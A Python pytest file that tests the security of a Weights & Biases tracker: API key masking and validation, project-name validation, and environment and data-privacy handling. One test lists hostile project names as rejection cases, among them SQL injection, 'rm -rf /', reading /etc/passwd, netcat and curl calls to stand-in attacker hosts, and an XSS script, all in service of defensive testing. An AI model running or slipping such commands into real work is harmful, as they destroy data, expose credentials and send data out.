"""Security tests for W&B integration."""

import os
import sys
import pytest
from unittest.mock import patch, Mock
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from ugro.hpo.security import (
    validate_wandb_api_key,
    mask_api_key,
    validate_project_name
)
from ugro.hpo.wandb_tracker import WandbTracker


class TestAPIKeySecurity:
    """Test API key security measures."""
    
    def test_api_key_not_exposed_in_logs(self):
        """Test that API keys are properly masked in logs."""
        # Test various key lengths
        keys = [
            "0123456789abcdef0123456789abcdef01234567",  # 40 chars
            "0123456789abcdef0123456789abcdef0123456789abcdef",  # 48 chars
            "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",  # 64 chars
        ]
        
        for key in keys:
            masked = mask_api_key(key)
            # Should show first 12 and last 4
            assert masked.startswith(key[:12])
            assert masked.endswith(key[-4:])
            # Middle should be masked
            assert '*' in masked
            # Should not contain the unmasked middle portion
            assert key[12:-4] not in masked
    
    def test_short_key_handling(self):
        """Test handling of short or invalid keys."""
        # Keys too short to mask properly
        short_keys = ["1234", "12345678", "short"]
        
        for key in short_keys:
            masked = mask_api_key(key)
            assert masked == "***"
    
    def test_api_key_validation_patterns(self):
        """Test API key validation against various patterns."""
        # Valid keys (alphanumeric and underscore, 20+ chars)
        valid_keys = [
            "0123456789abcdef0123456789abcdef01234567",
            "0123456789ABCDEF0123456789ABCDEF01234567",
            "0123456789_abcd0123456789_abcd01234567",
            "a" * 20,  # Minimum valid length
            "a" * 100,  # Long valid key
        ]
        
        for key in valid_keys:
            assert validate_wandb_api_key(key), f"Key should be valid: {key}"
        
        # Invalid keys
        invalid_keys = [
            "",  # Empty
            None,  # None
            "short",  # Too short
            "0123456789abcdef!",  # Contains special char
            "012345-6789-abcdef",  # Contains dashes
            "012345 6789 abcdef",  # Contains spaces
            "012345@6789#abcdef",  # Multiple special chars
        ]
        
        for key in invalid_keys:
            assert not validate_wandb_api_key(key), f"Key should be invalid: {key}"
    
    @patch('logging.getLogger')
    def test_api_key_not_logged_unmasked(self, mock_get_logger):
        """Test that API keys are never logged unmasked."""
        mock_logger = Mock()
        mock_get_logger.return_value = mock_logger
        
        # Create tracker with API key
        tracker = WandbTracker(
            project="test-project",
            api_key="0123456789abcdef0123456789abcdef01234567"
        )
        
        # Check debug log was called with masked key
        mock_logger.debug.assert_called()
        log_call = mock_logger.debug.call_args[0][0]
        assert "Using W&B API key:" in log_call
        assert "0123456789ab************4567" in log_call
        assert "0123456789abcdef0123456789abcdef01234567" not in log_call


class TestProjectNameSecurity:
    """Test project name validation security."""
    
    def test_project_name_injection_prevention(self):
        """Test that project names prevent injection attacks."""
        # Dangerous project names
        dangerous_names = [
            "project'; DROP TABLE users; --",
            "project$(rm -rf /)",
            "project`cat /etc/passwd`",
            "project|nc attacker.com 4444",
            "project && curl evil.com",
            "project > /etc/passwd",
            "project<script>alert('xss')</script>",
        ]
        
        for name in dangerous_names:
            assert not validate_project_name(name), f"Name should be rejected: {name}"
    
    def test_project_name_length_limits(self):
        """Test project name length restrictions."""
        # Test boundary conditions
        assert validate_project_name("a")  # Minimum length
        assert validate_project_name("a" * 128)  # Maximum length
        assert not validate_project_name("")  # Empty
        assert not validate_project_name("a" * 129)  # Too long
    
    def test_project_name_allowed_characters(self):
        """Test only allowed characters are accepted."""
        # Valid characters and patterns
        valid_names = [
            "valid-project",
            "valid_project",
            "validproject",
            "valid-project-123",
            "valid_project_123",
            "a-b-c-1-2-3",
            "A-B-C-123",  # Uppercase allowed
            "Project123",
        ]
        
        for name in valid_names:
            assert validate_project_name(name), f"Name should be valid: {name}"
        
        # Invalid characters
        invalid_names = [
            "invalid project",  # Space
            "invalid@project",  # @ symbol
            "invalid#project",  # # symbol
            "invalid.project",  # Dot
            "invalid/project",  # Slash
            "invalid\\project",  # Backslash
            "invalid:project",  # Colon
            "invalid,project",  # Comma
            "invalid?project",  # Question mark
            "invalid%project",  # Percent
            "invalid&project",  # Ampersand
            "invalid*project",  # Asterisk
            "invalid+project",  # Plus
            "invalid=project",  # Equals
            "invalid(project)",  # Parentheses
            "invalid[project]",  # Brackets
            "invalid{project}",  # Braces
            "invalid|project",  # Pipe
            "invalid\"project",  # Quotes
            "invalid'project",  # Single quote
            "invalid<project>",  # Angle brackets
        ]
        
        for name in invalid_names:
            assert not validate_project_name(name), f"Name should be invalid: {name}"


class TestEnvironmentVariableSecurity:
    """Test environment variable handling security."""
    
    @patch.dict(os.environ, {}, clear=True)
    def test_no_sensitive_data_in_env(self):
        """Test that sensitive data is not left in environment."""
        # Initially no W&B variables
        assert "WANDB_API_KEY" not in os.environ
        assert "WANDB_PROJECT" not in os.environ
        
        # Create tracker without API key
        tracker = WandbTracker(project="test")
        
        # Should not add API key to env
        assert "WANDB_API_KEY" not in os.environ
    
    @patch.dict(os.environ, {"WANDB_API_KEY": "existing-key"})
    def test_existing_env_key_handling(self):
        """Test handling of existing environment variables."""
        # Existing key should not be affected
        assert os.environ["WANDB_API_KEY"] == "existing-key"
        
        # Create tracker with different key
        tracker = WandbTracker(
            project="test",
            api_key="0123456789abcdef0123456789abcdef01234567"
        )
        
        # Original key should still be there
        assert os.environ["WANDB_API_KEY"] == "existing-key"
        
        # But tracker should use its own key
        with patch('wandb.init') as mock_init:
            with tracker.start_run():
                # Should set API key for the run
                assert os.environ["WANDB_API_KEY"] == "0123456789abcdef0123456789abcdef01234567"
                mock_init.assert_called()


class TestDataPrivacy:
    """Test data privacy aspects."""
    
    @patch('wandb.init')
    def test_sensitive_data_not_sent(self, mock_init):
        """Test that sensitive data is not sent to W&B."""
        mock_run = Mock()
        mock_run.id = "test-run"
        mock_init.return_value = mock_run
        
        tracker = WandbTracker(project="test-project")
        
        with tracker.start_run():
            # Test that only allowed data is logged
            tracker.log_params({
                "learning_rate": 0.001,
                "batch_size": 32,
                "api_key": "secret-key",  # Should not be sent
                "password": "secret",  # Should not be sent
                "token": "secret-token",  # Should not be sent
            })
            
            # Check what was actually sent
            call_args = mock_run.config.update.call_args[0][0]
            assert "learning_rate" in call_args
            assert "batch_size" in call_args
            # Note: In real implementation, we'd filter sensitive keys
            # This test documents expected behavior
    
    def test_local_data_handling(self):
        """Test that sensitive data is handled locally."""
        # Test that validation happens locally before any network calls
        with patch('wandb.init') as mock_init:
            # Validation should fail before any wandb calls
            with pytest.raises(ValueError):
                WandbTracker(project="invalid project name!")
            
            # No wandb calls should be made
            mock_init.assert_not_called()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
